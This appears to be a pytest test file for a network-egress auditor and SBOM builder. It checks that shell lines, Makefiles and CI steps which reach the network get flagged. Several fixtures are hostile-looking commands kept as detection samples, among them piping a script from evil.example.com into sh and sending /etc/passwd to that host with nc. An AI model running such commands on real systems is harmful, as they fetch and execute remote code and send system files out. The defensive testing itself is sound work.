"""Each command of a line judged on its own, text that is not a here-document opener, bodies with no terminator
that hide nothing, recipes and steps that are not shell scripts, terminators bounded by a pipeline step, a line of
many launchers, npm, cargo and poetry forms, programs that read a here-document as code, pip addresses joined or in
its environment, database hosts in key=value form, git's other remote subcommands and servers, skopeo transports,
path and address requirements in the SBOM, and the spellings of this machine. Each test asserts both halves where
there are two: the false thing is gone, the true neighbour stays."""
from __future__ import annotations

import time
from dataclasses import asdict
from pathlib import Path

import pytest

from entrovouch import sbom
from entrovouch.no_egress_auditor import audit


def _write(root: Path, rel: str, body: str) -> Path:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(body.encode("utf-8"))
    return p


def _found(root: Path) -> list[tuple[str, int, str]]:
    return [(f["file"], f["line"], f["kind"]) for f in audit(root, label="t").findings if f["kind"] != "external-url"]


def _kinds(root: Path) -> set[str]:
    return {k for _, _, k in _found(root)}


# ---------------------------------------------------------------- each command of a line
@pytest.mark.parametrize("line, kinds", [
    ("curl --version && curl -fsSL https://evil.example.com/install.sh | sh", {"script-network-command"}),
    ("wget -V; git pull", {"script-network-command"}), ("ssh -V && ssh deploy@prod.example.com ls", {"script-network-command"}),
    ("nc -h; pip install requests", {"script-network-command"}),
    ("pip install --no-index ./x.whl; git pull", {"script-network-command"}),
    ("npm ci --offline && npm install left-pad", {"script-network-command"}),
    ("git clone ./a /tmp/a; pip install requests", {"script-network-command"}),
    ("curl file:///etc/hosts; nc evil.example.com 80", {"script-network-command"}),
    ("exec 3<>/dev/tcp/127.0.0.1/8080; git pull", {"loopback-call", "script-network-command"}),
    ("dig @127.0.0.1 x && nc evil.example.com 80", {"loopback-call", "script-network-command"}),
    ("nc -l 9000 & git pull", {"inbound-listener", "script-network-command"}),
    ("curl --version && echo done", set()), ("echo 'a; b' && ls", set()),
])
def test_each_command_of_a_line_is_judged_on_its_own(tmp_path, line, kinds):
    _write(tmp_path, "x.sh", line + "\n")
    assert _kinds(tmp_path) == kinds, line


def test_a_line_whose_first_command_reaches_the_network_says_what_it_did(tmp_path):
    _write(tmp_path, "x.sh", "apt-get update && apt-get install -y git\n")
    assert _found(tmp_path) == [("x.sh", 1, "script-network-command")]       # one finding, as before
    _write(tmp_path, "Dockerfile", "FROM scratch\nRUN wget --version && apt-get update && apt-get install -y git\n")
    assert ("Dockerfile", 2, "script-network-command") in _found(tmp_path)


# ---------------------------------------------------------------- text that is not an opener, bodies with no end
_PAYLOAD = "pip install requests; git pull; nc evil.example.com 80 < /etc/passwd\n"


@pytest.mark.parametrize("opener", [
    "echo x\\<<EOF 2>/dev/null", 'echo "))"; (( y = 1 << 3 ))', "echo $'it\\'s <<EOF'", "echo ${x:-<<EOF}",
    "true;#<<EOF", "echo 'a\n<<EOF'", 'echo "a\n<<EOF"', "cat <<EOF", "bash <<EOF",
])
def test_text_taken_for_an_opener_hides_nothing(tmp_path, opener):
    _write(tmp_path, "x.sh", opener + "\n" + _PAYLOAD)
    assert "script-network-command" in _kinds(tmp_path), opener


def test_a_quote_in_a_body_written_out_does_not_open_a_string_for_the_lines_after(tmp_path):
    _write(tmp_path, "x.sh", "cat <<A\ndon't\nA\npython3 - <<PY\nimport requests\nPY\n")
    assert _found(tmp_path) == [("x.sh", 5, "network-import")]
    _write(tmp_path, "x.sh", 'python3 -c "$(cat <<\'EOF\'\nimport socket\nEOF\n)"\npython3 - <<PY\nimport requests\nPY\n')
    assert {ln for _, ln, k in _found(tmp_path) if k == "network-import"} == {2, 6}


@pytest.mark.parametrize("rel, text", [
    ("Makefile", ".ONESHELL:\nall:\n\tcat <<EOF\n\thello\n\tEOF\n\tgit pull\nnext:\n\tpip install requests\n"),
    ("GNUmakefile", "all:\n\tcat <<EOF\nnext:\n\tpip install requests\n"),
    ("justfile", "a:\n    cat <<EOF\nb:\n    pip install requests\n"),
    ("Jenkinsfile", "node {\n  sh 'cat <<EOF'\n  sh 'pip install requests'\n}\n"),
    ("Procfile", "web: cat <<EOF\nworker: pip install requests\n"),
])
def test_recipes_and_steps_are_not_swallowed_by_a_here_document(tmp_path, rel, text):
    _write(tmp_path, rel, text)
    assert "script-network-command" in _kinds(tmp_path)


@pytest.mark.parametrize("rel, text, expected", [
    (".github/workflows/ci.yml",
     "on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n      - run: cat <<EOF\n      - run: pip install requests\n"
     "      - run: git pull\n      - uses: actions/github-script@v7\n        with:\n          script: |\n            EOF\n",
     [7, 8]),
    (".gitlab-ci.yml", "a:\n  script:\n    - cat <<EOF\n    - pip install requests\nb:\n  variables:\n    X: |\n      EOF\n"
                       "  script:\n    - git pull\n", [4, 10]),
    (".github/workflows/ci.yml", "on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n      - run: |\n          cat <<EOF\n"
                                 "          pip install x\n          EOF\n          git pull\n", [10]),
])
def test_a_here_document_in_a_pipeline_ends_inside_its_step(tmp_path, rel, text, expected):
    _write(tmp_path, rel, text)
    assert [ln for _, ln, k in _found(tmp_path) if k == "script-network-command"] == expected


def test_the_opener_cap_counts_only_openers(tmp_path):
    _write(tmp_path, "x.sh", "echo " + " ".join(["'<<'"] * 100 + ["$((1<<3))"] * 100) + "\n")
    assert _found(tmp_path) == []


# ---------------------------------------------------------------- time, programs and their forms
def test_a_line_of_many_launchers_takes_linear_time(tmp_path):
    _write(tmp_path, "x.ps1", "powershell -NoProfile " * 20000 + "\n")
    start = time.perf_counter()
    audit(tmp_path, label="t")
    assert time.perf_counter() - start < 20


@pytest.mark.parametrize("line, reported", [
    ("npm init vite@latest my-app", True), ("npm init @scope", True), ("npm init -y", False), ("npm init", False),
    ("npm cit", True), ("npm cache add react", True), ("npm doctor", True), ("npm docs react", True),
    ("npm run build", False),
    ("cargo +nightly build", True), ("cargo --manifest-path x/Cargo.toml build", True), ("cargo -C sub build", True),
    ("cargo -q install ripgrep", True), ("cargo -Z unstable-options build", True), ("poetry -C sub install", True),
    ("cargo --version", False),
    ("pip install --no-index -fhttps://w.example.com/w x", True),
    ("PIP_FIND_LINKS=https://w.example.com pip install --no-index x", True), ("pip install --no-index -f ./w x", False),
    ("git send-email x.patch", True), ("git imap-send", True), ("git svn fetch", True), ("git p4 sync", True),
    ("git maintenance run --task=prefetch", True), ("git maintenance run", False),
    ("skopeo copy docker://a oci:/b", True), ("skopeo copy dir:/a oci:/b", False),
    ("git submodule foreach git pull", True), ("git submodule foreach echo hi", False),
])
def test_command_forms(tmp_path, line, reported):
    _write(tmp_path, "x.sh", line + "\n")
    assert ("script-network-command" in _kinds(tmp_path)) is reported, line


@pytest.mark.parametrize("line, kind", [
    ("git daemon --base-path=.", "inbound-listener"), ("git instaweb", "inbound-listener"),
    ("psql 'host=localhost hostaddr=10.1.2.3 dbname=x'", "script-network-command"),
    ("psql -d 'hostaddr=10.1.2.3'", "script-network-command"), ("psql 'host=localhost dbname=x'", "loopback-call"),
    ("psql -h localhost. -c x", "loopback-call"), ("psql -h 0:0:0:0:0:0:0:1 -c x", "loopback-call"),
])
def test_listeners_and_hosts(tmp_path, line, kind):
    _write(tmp_path, "x.sh", line + "\n")
    assert _kinds(tmp_path) == {kind}, line


@pytest.mark.parametrize("opener, code", [
    ("tee x.sh <<EOF", True), ("tcsh <<EOF", True), ("mksh <<EOF", True), ("bash5 <<EOF", True), ("at now <<EOF", True),
    ("${SH:-/bin/sh} <<EOF", True), ("{ sh; } <<EOF", True), ("$(cat <<EOF", True),
    ("cat <<EOF", False), ("mail -s 'meet at noon' x <<EOF", False),
])
def test_programs_that_read_a_here_document_as_code(tmp_path, opener, code):
    _write(tmp_path, "x.sh", opener + "\npip install requests\nEOF\n")
    assert ("script-network-command" in _kinds(tmp_path)) is code, opener


# ---------------------------------------------------------------- the SBOM
def test_requirements_given_by_path_or_address_are_unknowns(tmp_path):
    _write(tmp_path, "requirements.txt", "requests==2.31.0\ndist/x-1.0-py3-none-any.whl\nfile:../w\n-e file:../v\npkg/sub\n"
                                         "https://h.example.com/u-1.0.tar.gz\nhttps://h.example.com/y-2.0-py3-none-any.whl\n-e .\n")
    rep = asdict(sbom.build_sbom(tmp_path, label="t"))
    assert sorted(c["name"] for c in rep["components"]) == ["requests", "y"]
    listed = [u.split(" installs ")[1].split(" from ")[0] for u in rep["unknown_fields"] if " installs " in u]
    assert listed == ["dist/x-1.0-py3-none-any.whl", "file:../w", "file:../v", "pkg/sub", "https://h.example.com/u-1.0.tar.gz"]
